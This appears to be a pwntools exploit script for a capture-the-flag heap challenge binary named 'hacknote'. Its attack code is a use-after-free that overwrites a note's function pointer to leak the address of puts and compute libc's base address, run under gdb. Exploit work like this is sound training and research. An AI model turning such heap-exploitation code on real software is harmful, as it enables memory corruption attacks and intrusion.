from pwn import *

BUF = 'AAAA'
PRINT_FROM_NEXT_BYTE_FUNC = p32(0x0804862B)
NOTE_AMOUNT = 2
libc = ELF('libc_32.so.6')
hacknote = ELF('hacknote')
PUTS_GOT_PLT_ADDR = p32(0x0804a024)


class Prompts:
    CHOICE = 'Your choice :'
    NOTE_SIZE = 'Note size :'
    CONTENT = 'Content :'
    INDEX = 'Index :'


class BinSizes:
    NOTE = '8'
    CONTENT = '40'


class Choices:
    ADD = '1'
    DELETE = '2'
    PRINT = '3'


def add_different_bin_notes(p):
    print("[*] Adding (allocating) notes whose content size is different than the note's size.")
    for _ in range(NOTE_AMOUNT):
        p.sendafter(Prompts.CHOICE, Choices.ADD)
        p.sendafter(Prompts.NOTE_SIZE, BinSizes.CONTENT)
        p.sendafter(Prompts.CONTENT, BUF)


def fill_bin_with_note_chunks(p):
    print("[*] Deleting (freeing) the notes so that the note and content chunks end up on different fastbins.")
    for note_index in range(NOTE_AMOUNT):
        p.sendafter(Prompts.CHOICE, Choices.DELETE)
        p.sendafter(Prompts.INDEX, str(note_index))


def add_same_bin_note(p):
    print("[*] Add (allocate) a note whose content size is equivalent to that of a note.")
    p.sendafter(Prompts.CHOICE, Choices.ADD)
    p.sendafter(Prompts.NOTE_SIZE, BinSizes.NOTE)
    p.sendafter(Prompts.CONTENT, PRINT_FROM_NEXT_BYTE_FUNC + PUTS_GOT_PLT_ADDR)


def call_note_func(p):
    print("[*] Calling the overridden function.")
    p.sendafter(Prompts.CHOICE, Choices.PRINT)
    p.sendafter(Prompts.INDEX, '0')


def read_libc_base_address(p):
    print(f"[*] Leaking libc's base address.")
    libc_base = u32(p.read()[:4]) - libc.symbols['puts']
    print(f"[*] libc's base address: {hex(libc_base)}")
    return libc_base


p = gdb.debug(
    hacknote.path,
    f'''
    b *0x08048B35
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def main():
    add_different_bin_notes(p)
    fill_bin_with_note_chunks(p)
    add_same_bin_note(p)
    call_note_func(p)
    libc_base = read_libc_base_address(p)


if __name__ == "__main__":
    main()
